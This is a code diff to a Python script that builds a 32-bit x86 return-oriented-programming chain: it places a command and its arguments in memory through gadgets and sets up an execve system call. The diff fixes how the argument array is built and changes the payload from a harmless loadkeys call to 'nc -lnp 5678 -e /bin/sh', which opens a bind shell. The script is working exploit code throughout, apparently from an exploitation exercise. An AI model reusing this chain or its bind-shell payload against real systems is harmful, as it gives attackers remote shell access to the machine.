@@ -50,7 +50,8 @@ class ParseChain():
         self.DATA = int(data_loc, 16)
 
 
-    def build_stack_str(self, p, s, offset, bound):
+    def build_stack_str(self, p, s, offset):
+        bound = math.ceil(len(s) / 4)
         for i in range(0, bound):
             p += self.POP_EDX
             p += pack('<I', self.DATA + offset + i*4)
@@ -74,22 +75,43 @@ class ParseChain():
         p += b'B'*4
 
         offset = 0
-        cmd_bound = math.ceil(len(cmd) / 4)
-        p = self.build_stack_str(p, cmd, offset, cmd_bound)
+        shadow_offset = 100
 
-        offset += cmd_bound * 4 + 4
+        p = self.build_stack_str(p, cmd, offset)
+
+        p += self.POP_EDX
+        p += pack('<I', self.DATA + shadow_offset)
+        p += self.POP_EAX
+        p += pack('<I', self.DATA + offset)
+        p += self.MOVSTACK
+
+        shadow_offset += 4
+
+        offset += len(cmd) + 1
         for arg in args:
-            bound = math.ceil(len(arg) / 4)
-            p = self.build_stack_str(p, arg, offset, bound)
-            offset += bound * 4 + 1
+            p = self.build_stack_str(p, arg, offset)
+
+            p += self.POP_EDX
+            p += pack('<I', self.DATA + shadow_offset)
+            p += self.POP_EAX
+            p += pack('<I', self.DATA + offset)
+            p += self.MOVSTACK
+
+            shadow_offset += 4
+            offset += len(arg) + 1
+
+        p += self.POP_EDX
+        p += pack('<I', self.DATA + shadow_offset)
+        p += self.XOR_EAX
+        p += self.MOVSTACK
 
         p += self.POP_EBX
         p += pack('<I', self.DATA)
         p += self.POP_ECX_EBX
-        p += pack('<I', self.DATA + len(cmd))
+        p += pack('<I', self.DATA + 100)
         p += pack('<I', self.DATA)
         p += self.POP_EDX
-        p += pack('<I', self.DATA + len(cmd))
+        p += pack('<I', self.DATA + shadow_offset)
 
         p += self.XOR_EAX
         for _ in range(0, 11): p += self.INC_EAX
@@ -112,7 +134,7 @@ class ParseChain():
             regex = re.search("# @ .data\n", line)
             if regex: self.parse_data_loc(line.split(",")[1][1:11])
         
-        chain = self.make_chain('/bin//loadkeys', ['-tte', '-sssk', '-k'])
+        chain = self.make_chain('/tmp//nc', ['-lnp', '5678', '-e', '/bin/sh'])
         self.write_chain(chain)
 
 pc = ParseChain()
